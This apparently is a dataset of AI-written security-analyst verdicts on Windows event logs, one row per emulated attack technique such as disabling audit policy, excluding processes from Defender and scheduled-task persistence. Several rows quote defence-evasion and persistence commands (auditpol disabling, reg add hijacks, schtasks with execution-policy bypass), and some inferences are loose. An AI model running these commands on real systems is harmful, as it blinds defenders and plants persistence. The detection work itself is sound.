   - Frequent executions of `wevtutil.exe`, likely related to event log interactions, could warrant further scrutiny, but given the context that they are performed by a legitimate user, there's no immediate evidence of compromise.
   - The execution of `cmd.exe` with a `reg add` command modifying the Windows Update settings (specifically disabling connections to Windows Update internet locations) is unusual. This action could suggest an attempt to alter Windows Update settings, which might be indicative of evasive actions by an attacker.
   - The use of `reg.exe` to modify registry keys via command line is particularly noteworthy and could signify potentially suspicious behavior, especially if not part of routine administrative tasks.

3. **Security Log:**
   - Time change events recorded here align with the system log and do not indicate suspicious activity.

4. **Application Log:**
   - The activity by the Software Protection Platform Service (event 16384) does not present any cause for concern, as this is part of standard operations.

**Assessment and Resolution:**

The most concerning activity in the logs is the alteration of Windows Update policies via the registry, initiated through a command line by `cmd.exe` and `reg.exe`. This kind of behavior might be indicative of an attacker attempting to disable system updates as part of a larger attack strategy to maintain persistence or evade detection.

**Resolution: SUSPICIOUS**

- **Guidance on How to Proceed:**
   - Confirm whether the action on the registry key was authorized or part of any maintenance task by consulting the relevant IT staff or team responsible for the system's configuration.
   - Review additional logs to determine if there is more context on the `cmd.exe` and `reg.exe` invocation.
   - Consider enabling more detailed logging and monitoring on the system to catch other potentially suspicious actions.
   - Check for other signs of compromise around the timeframe of these events, such as unexpected network connections, process executions, or changes in system files.
   - If unauthorized actions are confirmed, consider taking corrective actions such as reverting the registry changes and ensuring the system is updated and patched."
File Extension Masquerading,"Upon reviewing the provided Windows event logs, several patterns and activities stand out as potentially indicating malicious activity. Below is a detailed analysis categorized by log types and specific findings:

### Security Log Analysis:
1. **Event ID 5379**: Multiple occurrences indicate attempts to retrieve credentials through Named Credential Manager. All attempts failed with a return code `3221226021`, which corresponds to `STATUS_NOT_FOUND`. The pattern of repeated credential access attempts against the MicrosoftAccount and WindowsLive services is suspicious and may suggest attempted credential stuffing or unauthorized access attempts.

2. **Event ID 4624 and 4672**: System-level logons and privileges where the user `SYSTEM` acquired extensive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While SYSTEM operations can be normal under certain circumstances, in combination with other events, it could indicate lateral movement or preparation for privilege escalation.

### PowerShell Log Analysis:
1. **Execution of PowerShell Scripts**: Powershell was used to execute scripts stored in temporary directories with seemingly masqueraded filenames like `data.003_masquerading.doc.ps1` and variations of other document extensions (e.g., `.pdf.ps1`, `.rtf.ps1`). This is a classic example of fileless malware attempting to evade detection by using common document extensions in script names. 

### Sysmon Log Analysis:
1. **Sysmon Event ID 1 (Process creation)**: Various processes indicative of potential malicious activity were created:
   - **cmd.exe Execution**: Using `cmd.exe` for copying executable files (calc.exe) under different guises in temporary directories is highly suspicious and indicative of potential malware preparing for fileless execution.
   - **Conhost and Powershell Execution**: Frequent invocation of `powershell.exe` with scripts having misleading names suggests automation of potentially malicious tasks.
   - **Suspect Parent-Child Relationships**: The command lines and parent-child process relationships suggest attempts at masquerading and persistence.

### Assessment:
- The suspicious behavior in the logs, particularly the repeated failed credential access, usage of masqueraded PowerShell scripts for execution, and manipulation of processes with potentially altered or misleading file extensions, collectively indicate a high probability of malicious intent or compromise.

### Resolution:
- **MALICIOUS** - The combination of credential access attempts, usage of temporary directories for PowerShell scripts with misnamed extensions, and evaluated process execution indicates a likely malicious compromise. 

### Guidance:
- **Immediate Actions**:
  - Isolate the affected device(s) to prevent further potential damage or data exfiltration.
  - Conduct a full forensic investigation on the affected system(s) to identify the entry point of the breach.
  - Review and strengthen credential policies and consider resetting passwords for potentially compromised accounts.
  - Update all endpoint protection systems and perform a full scan across the network to detect similar activities.
  - Review and restrict unnecessary administrative privileges to reduce the surface for potential privilege escalation.

These findings highlight the importance of maintaining vigilant monitoring, implementing strict security policies, and ensuring comprehensive incident response procedures are in place."
Register Portable Virtualbox,"Upon analyzing the provided Windows event logs, we can identify several potentially suspicious activities and behaviors worth further investigation. Let's break down the findings in detail:

### Sysmon Logs

1. **PowerShell Activity:**
   - **EventID 5:** There are multiple entries of PowerShell execution (`powershell.exe`) initiated by the user `SERVER002\admin_test`. The command-line arguments or script details are not explicitly provided in the logs. PowerShell can often be used in legitimate automation tasks but is also a common tool leveraged in attacks due to its scripting capabilities. Without specific command details, this activity warrants cautious flagging for review.

2. **Command Execution with High Integrity:**
   - **CMD.exe and VBox Components:** Entry showing `cmd.exe` executing a complex command with multiple components, including `regsvr32`, `rundll32`, and `sc`. This command might be related to installing or manipulating VirtualBox drivers. The execution with `High` integrity level indicates elevated privileges were involved. While this can be legitimate, it is noteworthy due to its complexity and execution context, prompting further questioning about any recent or known installations.

3. **Network Activity:**
   - **Network Services:** The presence of typical system processes (e.g., `svchost.exe`, `SecurityHealthService.exe`) being logged mirrors standard operations unless specifics suggest suspicious behaviors like unknown services or malicious parameters.
   
4. **Unusual File Downloads via PowerShell:**
   - In the PowerShell logs, there is a PowerShell command to create directories and download a file from GitHub (`common.cab`). File downloads from external sources using PowerShell are red flags that require scrutiny to determine legitimacy.

### Security Logs

1. **Privileges and Tokens:**
   - **Elevated Tokens and Privileges:** Events indicate administrative activities with a high array of assigned privileges, like `SeDebugPrivilege` and others. While the activities themselves do not appear unusual for an admin context, it's significant in evaluating the scope of logged user permissions concerning excessive privilege risks.

### Conclusion and Recommendations

Based on the provided log data:

- **SUSPICIOUS** behavior is identified:
  - The use of PowerShell for downloading potentially sensitive files.
  - The command execution involving DLL and registry modifications with elevated privileges.
  - The context of the CEO's workstation, where unintended actions suggest potential security breaches or insider actions.

**Recommendations for Next Steps:**
- **Immediate Further Investigation:**
  - Validate the legitimacy of the PowerShell download task – inspect the GitHub file, verify intentions, and check against known threats.
  - Determine if recent software installations or updates align with entry logs – especially related to VirtualBox.
  - Conduct an endpoint threat scan and integrity checks for possible unauthorized changes concurrent with the findings.
  - Consider monitoring user `admin_test` activities for abnormal usage patterns, potentially informing on risk insider threats or compromised accounts.

In summary, the activities recorded in this log dataset invite suspicion due to the administrative usage of scripting and power tools often associated with malicious intents. Thus, they are classified as **SUSPICIOUS** and warrant further investigation to confirm or rule out potential threats."
Impair Windows Audit Log Policy,"Upon reviewing the provided event logs for the Windows host, several patterns and activities can be discerned, leading to a potential assessment of the situation:

### Analysis

1. **Audit Policy Changes**:
   - There are multiple events showing changes to audit policies (Event ID 4719) with the user `SERVER002\admin_test`. The command `auditpol` is used to disable success/failure auditing for ""Account Logon"", ""Logon/Logoff"", and ""Detailed Tracking"". This is a red flag because attackers often disable auditing to avoid detection after gaining unauthorized access.

2. **Use of Command-Line Tools**:
   - There are numerous executions of command-line tools such as `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and `auditpol.exe`, all executed by the admin_test account. While `whoami.exe` could be used benignly to verify the current user context, the combination of `wevtutil` and `auditpol` suggests an attempt to manipulate or clear event logs and disable auditing.

3. **Process Execution Flow**:
   - Observations show that `cmd.exe` was used to execute audit policy changes. The command-line arguments used with `cmd.exe` are particularly suspicious as they involve modifications that disable event logging:
     ```
     ""cmd.exe"" /c auditpol /set /category:""Account Logon"" /success:disable /failure:disable & auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable & auditpol /set /category:""Detailed Tracking"" /success:disable
     ```
   - This sequence indicates possible post-exploitation activities to cover tracks.

4. **Common System Operations**:
   - While operations like `Microsoft Edge Update` service activities and `svchost.exe` processes seem ordinary, in this context, the manipulation of system audit policies by an admin account overshadows these otherwise regular operations.

### Assessment

Based on the log activities, the behavior exhibited is highly indicative of malicious activity. The series of audit policy modifications, utilizing different tools to potentially disable security logging, aligns with tactics employed during a security breach where an adversary seeks to evade detection post-access:

1. **MalIntent Indicators**:
   - Disabling audit policies systematically.
   - Use of system utilities to potentially cover tracks.
   - Consistent use of elevated privileges by `admin_test`.

2. **Potential Risks**:
   - If these actions are indeed unauthorized, there is a risk of data exfiltration or internal reconnaissance by an adversary who is currently evading detection due to disabled logging.
   - Degraded system security monitoring capabilities due to audit policy changes.

### Guidance

- **Resolution**: **MALICIOUS**

Given the nature of the audit policy changes and the methodical use of command-line tools, this activity is concluded to be malicious.
  
### Recommended Actions:

1. **Immediate Response**:
   - Isolate the affected system (`Server002`) from the network to prevent any potential malicious communication.
   - Change credentials for `admin_test` and other sensitive accounts.
  
2. **Further Analysis**:
   - Conduct a full forensic investigation on `Server002` to assess the extent of the compromise.
   - Review network activity associated with the user account `admin_test`.

3. **Reinforce Security**:
   - Reset audit policies to their original states and ensure they are appropriately logging to a secure, centralized log server.
   - Implement strict monitoring for any further attempts to modify audit policies or suspicious command-line activity across the network."
Delete an entire folder - Windows cmd,"### Detailed Analysis of Provided Logs

#### Sysmon Logs Analysis
1. **Repeated Execution of `whoami.exe`**: The Sysmon logs show multiple entries for the execution of `whoami.exe` and `hostname.exe`. Both these applications are legitimate Windows utilities used for querying the currently logged-in user and the computer name, respectively. Frequent execution of `whoami.exe` could indicate scripting or automated testing but is not inherently malicious unless conducted in a suspicious context.

2. **Command Executions with `cmd.exe`**:
   - **Use of `cmd.exe`**: Several entries indicate the execution of `cmd.exe` with specific command-line arguments. The commands like:
     - `""cmd.exe"" /c IF EXIST ""%%temp%%\\deleteme_data.004"" ( EXIT 0 ) ELSE ( EXIT 1 )`
     - `""cmd.exe"" /c mkdir %%temp%%\\deleteme_data.004`
     - `""cmd.exe"" /c rmdir /s /q %%temp%%\\deleteme_data.004`
   - These commands appear to be testing for the existence of a file, creating, and then deleting a directory named `deleteme_data.004` in the `TEMP` directory.
   - This sequence could be indicative of a script or automated task intended for creating a temporary working directory for processing data, then cleaning up afterward. This activity, while unusual, is not definitively malicious.

3. **Console Host (`conhost.exe`) Execution**: Corresponding `conhost.exe` processes are spawned alongside `cmd.exe` processes. This is typical behavior as conhost.exe handles console window graphics for command-line applications.

4. **Use of `wevtutil.exe`**: Multiple executions of `wevtutil.exe`, a utility for managing Windows Event logs, were observed. The logs, however, do not provide sufficient detail regarding specific actions undertaken by `wevtutil.exe` to assess if these were malicious. Frequent use could suggest attempts to clear or manage event logs, which might be suspicious if done clandestinely.

5. **Use of `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe`**: These processes are native Windows services and utilities. Their presence in logs with standard execution details and authoritative user contexts like `NT AUTHORITY\SYSTEM` and `NETWORK SERVICE` is customary in operational systems.

#### Assessment and Conclusion
- **Suspicious Activity**: The script-like behavior observed with `cmd.exe` could indicate automation or a mass operation that is unexpected on a CEO's machine, given their typical responsibilities. This unusual execution pattern requires further verification to assess context and intent.

- **Benign Activity**: Executions of legitimate utilities like `whoami.exe`, `hostname.exe`, and the operating system services running as `svchost.exe` and others can be perceived as benign under normal operational circumstances.

- **Resolution**: 
  - **SUSPICIOUS**: The actions involving temporary file manipulation and event log handling could suggest either benign maintenance tasks or obfuscation attempts by malicious scripts. Further investigation is warranted, including reviewing file system changes, contextual user account actions, checking for script execution logs, and confirming these actions align with legitimate administrative tasks.

#### Guidance for Proceeding
- **Further Investigation**: Validate whether the processes and scripts were executed by authorized personnel or scheduled tasks. Investigate user activity corresponding to `SERVER002\admin_test` to understand the motive behind these actions.
  
- **Contextual Review**: Checking for related user alerts, recent system changes, and any unexpected behaviors can help clarify the purpose of these logs and assist in identifying any potential unauthorized activity.

- **System Baseline Check**: Compare these log entries against a known system baseline to detect anomalies and assure future alert tuning if similar benign patterns are routine."
Lolbin Jsc.exe compile javascript to dll,"Upon analyzing the provided Windows event logs, several points of interest and potential anomalies can be noted:

1. **Security Log Analysis**:
   - Multiple logon events (EventID 4624) indicate SYSTEM-level access and Privilege Assignments (EventID 4672) with multiple high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. Such privileges can be potentially used for privilege escalation or exploitation if leveraged by unauthorized users or malware.
   - Several Credential Validation Operations (EventID 5379) resulted in `ReturnCode` `3221226021`, which usually indicates a ""privilege not held"" error. This could suggest an attempt to access resources or perform operations without sufficient privileges, potentially by unauthorized actors.
   - Group membership enumerations (EventID 4798) using processes like `taskhostw.exe` should be regularly monitored as they can sometimes be leveraged for enumeration by adversarial actors on compromised systems.

2. **Sysmon Log Analysis**:
   - Repeated invocations of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` without clear necessity points toward potential unauthorized or suspicious usage patterns. `wevtutil.exe` can be used to manipulate event logs, which is a common tactic in persistence and anti-forensic measures.
   - Multiple uses of document processing tools (`cmd.exe`, `jsc.exe`) in temporary directories for compiling JavaScript to .NET library format may indicate scripting activities beyond regular administrative tasks.
   - The invocation of PowerShell may also suggest script-based activities which require further inspection, especially in environments sensitive to script-based attacks.
   - The usage of `wniprovhost.exe` and `cmd.exe` under potentially elevated contexts could represent legitimate administrative tasks but can also suggest scripts or toolkits being used by an actor with elevated privileges.

3. **Application Log Analysis**:
   - No immediately suspicious activities detected in these logs. The presence of Windows Defender being active is noted, which is positive as it suggests some level of defense is in place during these activities.

4. **Contextual Assessment**:
   - The presence of EDR-triggered alerts, alongside the execution of potentially suspicious binaries related to credential validation failures and the use of `wevtutil.exe`, strengthens the suspicion of a potential breach or unauthorized behavior.

**Conclusion**:
The collective behavior across various logs, with high levels of privilege, potential credential access attempts, and script execution, necessitates further detailed investigation.

Resolution: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a thorough endpoint investigation focusing on:
  - The specific activities of `admin_test` during the period in question.
  - Validation of the authenticity and legitimacy of all processes executed with high privileges.
  - Analysis of PowerShell script invocations to determine their intent.
- Examine network traffic for anomalies originating from `SERVER002`.
- Ensure robust and updated endpoint protection to guard against post-exploitation activities.
- Consider isolating the machine for in-depth forensic analysis to ensure no malicious footholds persist in the environment."
Windows Auto Update Option to Notify before download,"Upon reviewing the provided event logs from the Windows host, several key points warrant analysis for suspicious or potentially malicious activities:

1. **Time Manipulation Events:**
   - Multiple Security events with EventID 4616 indicate time change operations by `svchost.exe` under the user `LOCAL SERVICE`. While legitimate services make time configurations, malicious actors might manipulate system time to mask activities or bypass security mechanisms.

2. **Privileged Account Activity:**
   - Security events with EventID 4672 show the `admin_test` account being granted several high-privilege permissions (including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). Such elevated privileges could potentially be abused for malicious activities.

3. **Network Logon Sessions:**
   - Security EventID 4624 indicates `admin_test` logging in using NTLM authentication from a remote computer name `DESKTOP-3HL5B2P`. Although LogonType 3 (network) can be legitimate, it could suggest lateral movement or unauthorized access if this machine does not routinely access the server.

4. **Suspicious Process Creation:**
   - Sysmon logs (EventID 1) show processes like `cmd.exe`, `reg.exe`, and `whoami.exe` being executed by `admin_test`. Specifically, commands altering Windows Update settings (`cmd.exe /c reg add ...`) could signify attempts to disable updates and are characteristic of persistence mechanisms in malware attacks.

5. **Use of Built-in Windows Tools:**
   - Several Sysmon logs record the use of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is often misused for clearing event logs to hide malicious activity. `conhost.exe` could be started legitimately, but its frequency warrants attention.

6. **Microsoft Edge Update Activity:**
   - Numerous processes related to the Microsoft Edge Update service are executing, with no immediate suspicious context, given that updates often run with SYSTEM permissions and network communications. However, ensuring all downloads and updates are legitimate remains critical.

**Assessment:**
The combination of time manipulation, use of high-privilege accounts, altering system settings, and executing potentially suspicious processes creates a scenario that cannot be immediately categorized as commonplace user behavior. While there are no definitive indicators of compromise, the noticed activities possess characteristics often aligned with malicious intent or system abuse.

**Resolution: SUSPICIOUS**
The activities captured in the logs are suspicious and warrant further investigation. Particular focus should be on verifying the legitimacy of actions by the `admin_test` account and ensuring system integrity.

**Guidance:**
1. Conduct a detailed audit of recent activities and access logs related to `admin_test`.
2. Verify the integrity and update origin of associated Microsoft Edge update components.
3. Review network traffic to ensure no unauthorized data exfiltration or lateral movement attempts.
4. Monitor the system for any recurring suspicious processes or further unauthorized time changes.
5. If necessary, implement endpoint security measures or consult an incident response team for deeper forensic analysis."
Tamper with Windows Defender Evade Scanning -Process,"**Analysis of the Windows Event Logs:**

1. **System and Application Logs:**
   - The logs do not reveal any immediately suspicious or anomalous activity. The entries show routine activities such as time synchronization and system updates including security intelligence updates for Microsoft Defender Antivirus, which are typical system maintenance activities.
   - The application log entries for service stopped events concerning Edge Update do not show any unusual activity or errors that could indicate malicious activity.

2. **Sysmon Logs:**
   - The logs reveal a sequence of process executions that include legitimate system processes such as `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `MicrosoftEdgeUpdate.exe`. The execution of these processes seems consistent with regular system activities or software updates.
   - One notable entry involves the execution of `powershell.exe` with a command line that sets ""Add-MpPreference -ExclusionProcess outlook.exe"". While excluding processes from antivirus scans can be a legitimate activity, within a corporate or highly secure environment, it's unusual without proper documentation. An employee could have unintentionally or deliberately configured this improperly.

3. **Windows PowerShell Log:**
   - PowerShell logs show the execution of a command using `Add-MpPreference` to exclude ""outlook.exe"" from Microsoft Defender Antivirus scans. This action is suspicious as it may allow certain activities related to ""outlook.exe"" to execute without being scanned, which could potentially hide malicious activities if exploited by an attacker.

**Assessment & Recommendation:**

- There are no direct indicators of malicious software being present, but the action to exclude an application from antivirus scanning is unusual and warrants further investigation.
- Examine the reasoning behind this PowerShell command to ensure it aligns with operational protocols. Confirm whether this was authorized through official change control procedures or part of a troubleshooting effort.
- It's advisable to inspect the system closely for any signs of compromise around the time this change was made, and consider reverting the exclusion unless necessary for operational continuity.
- Additionally, confirm that no sensitive data within the excluded ""outlook.exe"" application is at risk.

**Resolution: SUSPICIOUS**

Due to the PowerShell command excluding ""outlook.exe"" from antivirus scans without clear justification, further investigation is needed to ascertain its necessity and potential risk implications."
Indirect Command Execution - Scriptrunner.exe,"## Analysis of the Logs

### Overview

The logs provided span multiple categories including Sysmon, Application, System, Security, and Windows PowerShell logs. We'll focus on identifying any unusual or potentially malicious activities.

### Sysmon Log Observations

1. **Multiple Instances of `wevtutil.exe` and `conhost.exe`:**
   - Several instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed by the user `SERVER002\admin_test`.
   - While these are legitimate Windows utilities, frequent and rapid execution could suggest log manipulation or command-line activity, but this is not conclusive of malicious activity alone without further context.

2. **Execution of `powershell.exe`:**
   - A notable entry is the execution of `powershell.exe` with a command line containing `Scriptrunner.exe -appvscript ""C:\Windows\System32\calc.exe""`.
   - Launching Calculator (`calc.exe`) through PowerShell in this manner is unusual and could suggest a test for command execution via scripts, possibly indicative of someone testing their environment or scripting capabilities. It warrants further investigation but isn't immediately malicious.

3. **Execution of `whoami.exe`:**
   - `whoami.exe` was executed, a utility that displays user information. This could indicate a user verifying logged-in user permissions. Again, unusual in frequency but not necessarily malicious.

4. **Multiple Edge Updates:**
   - Legitimate updates related to Microsoft Edge, showing update processes running under NT AUTHORITY\SYSTEM. These align with normal behavior for Edge updates.

### Application Log Observations

- **Service Stopping Entries:**
  - The entry showing ""Service stopped"" for `edgeupdate` without further context isn't inherently malicious as update services can start and stop as needed.

### System Log Observations

- **Kernel Time Change:**
  - Several Kernel-General log entries indicate time adjustments carried out by `svchost.exe`. Time changes can sometimes suggest attempts to evade detection or logs alignment; however, the reason and context were legitimate and consistent with system NTP synchronization activities.

### Security Log Observations

- **Time Change Logged:**
  - Reflects similar time change from System logs, logged as a security event, aligning with normal system operations initiated by LOCAL SERVICE.

### Windows PowerShell Log Observations

- **PowerShell Execution Context:**
  - Several entries in PowerShell logs confirm the execution environment regarding the command that attempted to run `calc.exe`. These align with the Sysmon log observations and lending more context to the execution method used.

### Assessment

- **BENIGN** for the majority of the logs containing Edge updates and system time management.
- **SUSPICIOUS** for instances of abnormal PowerShell command execution invoking non-standard routine programs like `calc.exe`. This can be indicative of testing or scripting activities but is not inherently malicious without additional indicators.

### Final Resolution

**Resolution: SUSPICIOUS**

The frequent use of `powershell.exe` to execute commands with `Scriptrunner.exe`, coupled with the frequency of certain administrative utilities, suggests unusual activity. While there is no unequivocal malicious activity detected, the unusual use of PowerShell warrants further investigation to confirm context and intent. This includes querying the involved user and ensuring no unauthorized scripts were run."
Creating W32Time similar named service using schtasks,"### Detailed Analysis of the Logs

Upon inspecting the provided logs, several activities are evident, and they have been broken down with their potential significance:

1. **Repeated Invocations of `wevtutil.exe` and `conhost.exe`:**
   - Events with `wevtutil.exe` and `conhost.exe` executing in quick succession generally indicate interactions with event logs, potentially reading or exporting them. While this could be normal administrative behavior, it is often associated with malicious activity when found on a high-value target like a CEO's machine, especially if these operations are repeated frequently.

2. **Execution of `HOSTNAME.EXE` and `whoami.exe`:**
   - The `HOSTNAME.EXE` and `whoami.exe` invocations are methods to gather information on the machine identity and logged-in user. While these utilities are benign, combined with other activities, their usage can be indicative of recon efforts by an attacker.

3. **Scheduling Task with `schtasks.exe` including a PowerShell Execution:**
   - The log entry involving `schtasks.exe` and the command `""cmd.exe"" /c schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\\data.004_NonExistingScript.ps1"" /tn win32times /f & schtasks /query /tn win32times` is particularly alarming. It attempts to run a PowerShell script with execution policy bypassed, which is a common method used for running potentially malicious scripts undetected.
   - The script path `c:\\data.004_NonExistingScript.ps1` suggests either a script that is not present or one that is obfuscated/misleading in its name or location.

4. **Component Updates and Anti-Malware Activity:**
   - The logs also indicate regular updates and operations related to Microsoft Defender. Events around `AM_Delta.exe` and `MpSigStub.exe` are typical for malware signature updates, suggesting that the system is being kept up-to-date for defensive purposes.

5. **Unsuccessful Microsoft Account Access Attempts:**
   - Multiple entries in the security logs (`EventID 5379`) show failed attempts to access Microsoft's account-related services, which might indicate attempts to authenticate or acquire access to a service token related to Microsoft account services.

### Assessment of the Situation

Given the nature of activities observed in the logs:

- **High Risk Identified:** The task creation with `schtasks.exe` to execute a PowerShell script indicates a high likelihood of malicious activity. This scheduling, especially in the context of a high-profile role like a CEO, can suggest potential persistence mechanism setup by an attacker.
- **Other Activities Supporting Suspicion:** While some activities could be benign, such as querying machine names and users, these are often part of a broader malicious reconnaissance effort.
  
### Resolution and Guidance

- **Resolution: MALICIOUS**

Given the task scheduling activity with PowerShell execution bypassing security measures, combined with potential reconnaissance signals, the activity can be classified as **MALICIOUS**.

### Recommendations

1. **Immediate Action:**
   - Disable or delete any scheduled tasks associated with the suspicious command, and ensure the PowerShell script does not exist or was not executed.
   - Check for any unauthorized changes or installations on the system. 

2. **Further Investigation:**
   - Inspect any files that correspond to the scheduled task or script mentioned.
   - Review other systems accessing the CEO's machine or the network segment for signs of similar behavior.

3. **Strengthening Security Posture:**
   - Ensure all machines in the environment are updated with the latest security patches.
   - Monitor and log all administrative activities, particularly those involving task scheduling and PowerShell executions. 
   - Consider stricter application whitelisting policies and privilege access management, especially for high-value targets like the CEO."
Abusing MyComputer Disk Fragmentation Path for Persistence,"### Analysis of the Logs

**Indicators of Suspicious or Malicious Activity:**

1. **Frequent Use of Windows Utilities:**
   - The logs show frequent execution of `wevtutil.exe` and `conhost.exe`. While these utilities themselves are not malicious, their execution in quick succession can be an indication of a script or batch job running, potentially used by an attacker to process or manipulate event logs.

2. **Execution of `cmd.exe` with Registry Modification:**
   - A `cmd.exe` process executed with a command-line argument that modifies the registry: `""/c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath"" /t REG_EXPAND_SZ /d ""%%systemroot%%\\system32\\notepad.exe"" /f""`. This modifies the system configuration to run Notepad instead of the default defragmentation tool, suggesting an attempt to misuse system functionalities.

3. **Time Manipulation:**
   - There are instances of time being adjusted in rapid succession, as seen in the system and security logs (`EventID 4616` and `EventID 1` from Kernel-General). While time adjustments can be part of normal NTP operations, they can also be exploited to conceal or confuse the timeline of events during an investigation.

4. **Use of System Utilities for Credential Access:**
   - `whoami.exe` was executed, which is used to gather information about the current user's privilege level. Such behavior can suggest reconnaissance activities conducted by an attacker to understand the system and user context.

5. **General Pattern of Administrative Utility Execution:**
   - The logs are saturated with the execution of utilities (`hostname.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`) under a high integrity level by the user `SERVER002\\admin_test`. The frequency and pattern are abnormal for typical administrative activity.

**Edge Update Activities:**
- The logs contain numerous entries associated with the Microsoft Edge Update process which is not inherently suspicious. However, these should be confirmed to align with legitimate updates (e.g., checking against Microsoft's known update schedule or methods).

### Assessment & Resolution

The logs exhibit activities such as the execution of potentially sensitive system tools with high privileges and a registry modification that is unusual and potentially dangerous. The combination of these activities suggests the possibility of either an automated task or a manual attempt to manipulate the system environment in ways that could potentially be malicious. These activities require further investigation to rule out misconfiguration or automation tools that might still be benign or part of a legitimate administrative script.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed
- **Further Investigation Needed:**
  - **Verify Legitimate Tasks:** Check if these processes are part of scheduled tasks or scripts designed by the IT department for administrative purposes.
  - **Conduct User Interview:** Engage with the user `admin_test` to verify if they executed these commands intentionally.
  - **Review Registry Changes:** Investigate the rationale behind modifying the registry to ensure it is part of an intentional and approved operation.
  - **Monitor Network Traffic:** Look for any signs of data exfiltration or abnormal communications related to these activities.
  - **Conduct Threat Hunting:** Initiate a more thorough investigation to look for other signs of intrusion, persistence mechanisms, or privilege escalation techniques.

Ultimately, ensure all activities align with expected operations for the systems in question, and if any unauthorized actions were identified, take necessary containment and remediation steps."
Execute base64-encoded PowerShell,"Upon thorough analysis of the provided logs, several components of interest were identified. Here is a detailed breakdown of the events noted:

1. **Repeated Execution of System Utilities:**
   - Multiple instances of the `wevtutil.exe` and `conhost.exe` processes are observed being executed by the `SERVER002\admin_test` user. Continuous utilization of these specific utilities might be indicative of a scripted or automated task. Wevtutil is a legitimate Windows command-line utility used to retrieve and manage event logs, and conhost.exe is associated with console windows. However, repeated invocation in quick succession is noteworthy and warrants further examination, particularly if not expected.

2. **Encoded PowerShell Commands:**
   - PowerShell logs reveal encoded commands such as:
     ```shell
     powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=
     ```
     This translates to a simple command: `Write-Host ""Hey, Atomic!""`. While the command itself is benign, the use of base64 encoded PowerShell commands is commonly associated with attempts to obfuscate potentially malicious activity. The presence of encoded PowerShell execution should be reviewed, particularly within an enterprise environment.

3. **System-Level Activity and Privilege:**
   - The logs show activities executed with elevated SYSTEM privileges, including attempts to update or manage Edge (MicrosoftEdge_X64) and other Windows services using processes like `sc.exe`. This is typically benign for system updates or processes but should be aligned with expected IT operations. 

4. **Failed Credential Access:**
   - The security log includes multiple Event ID 5379 entries indicating failed access attempts to secure tokens for a Microsoft account. Although inherently not malicious on its own, it raises a question about attempts to latch onto user account tokens, emphasizing the need to verify if these were expected and legitimate operations.

### Assessment:
- **Suspicious PowerShell Usage:** While no obviously malicious PowerShell commands are executed, the usage of encoded commands without necessity should be scrutinized, particularly within the involvement of high integrity level processes.
- **Audit for Automation or Scripting:** The proximity of certain logs suggests that activities may be automated or scripted, highlighting a need to confirm their legitimacy.
- **Elevated Privilege Activities:** Actions performed under elevated SYSTEM privileges require validation to determine that no privilege abuse or unauthorized access occurred.

### Resolution:
Given the identified encoded PowerShell activity combined with repetitive system utility executions, this raises a concern that requires further examination. No malicious activity is immediately apparent, but the behavior noted is:
- **Resolution:** **SUSPICIOUS** - The activities do not currently show clear malicious intent but warrant further investigation, especially around the PowerShell usage and process executions.

### Recommendations:
- **Investigate PowerShell Invocations:** Decode and further investigate the executed PowerShell commands to understand their intent, and monitor for any additional occurrences.
- **Review Scheduled Tasks:** Analyze scheduled tasks or automation tools that might be running recurring wevtutil and conhost executions.
- **Audit Account Usage:** Ensure that the SYSTEM level and `admin_test` account activities are indeed authorized and consistent with expected operations within the organization.
- **Continuous Monitoring:** Implement continuous monitoring for abnormal process behaviors and command-line usage, especially encoded PowerShell invocations."
User scope COR_PROFILER,"## Assessment and Analysis

**Overview:** Upon examining the provided Windows event logs, particularly focusing on the PowerShell and Sysmon logs, several indicators suggest suspicious behavior that requires further investigation. Let's break down the identified activities:

### Suspicious or Anomalous Behavior

1. **PowerShell Activity:**
   - **Registry Modification and DLL Loading:**
     - The command executed involves creating a registry key under `HKCU:\Software\Classes\CLSID` with the intention to load a DLL file from a temporary path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`. This behavior is characteristic of a fileless malware technique aiming to persist a malicious DLL.
   - **Environment Variables Manipulation:**
     - Modifications to environment variables such as `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH` are set. This is often used by malware to force the loading of a malicious profiler DLL under the guise of legitimate profiling, potentially indicative of a .NET profiling attack.
   - **Executing `eventvwr.msc`:**
     - The execution of `eventvwr.msc` through PowerShell is a known method to bypass User Account Control (UAC). It can be exploited by replacing COM objects with the aforementioned CLSID entry to escalate privileges.

2. **Sysmon Events:**
   - **Processes Involved:**
     - Multiple processes `wevtutil.exe`, `conhost.exe`, `powershell.exe`, `mmc.exe`, and `HOSTNAME.EXE` are being initiated by the `SERVER002\admin_test` user. The sequence and variety of these processes, especially `wevtutil.exe` and `conhost.exe`, align with process injection techniques often utilized by attackers to obfuscate command execution and manage processes stealthily.
   - **Parent-Child Process Relationship:**
     - PowerShell process (`ProcessId: 6728`) utilizing a command-line instruction that includes loading a suspicious DLL and initiating `mmc.exe` with `eventvwr.msc` suggests a scripted orchestration of these events for malicious intent.
   - **Use of `whoami.exe`:**
     - The use of `whoami.exe` might indicate an enumerative step to understand the context the script is operating under, potentially aimed at confirming administrative privileges.

### Indicators of Malicious Activity or Compromise

- The combination of registry modification, environment variable changes, and privilege escalation techniques through `eventvwr.msc` strongly suggests actions typical of advanced persistent threats or malware with intentions to establish persistence, execute payloads, and escalate privileges.
- The choice of the temporary directory for storing a potentially malicious DLL (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`) further implies an attempt to evade traditional security measures.

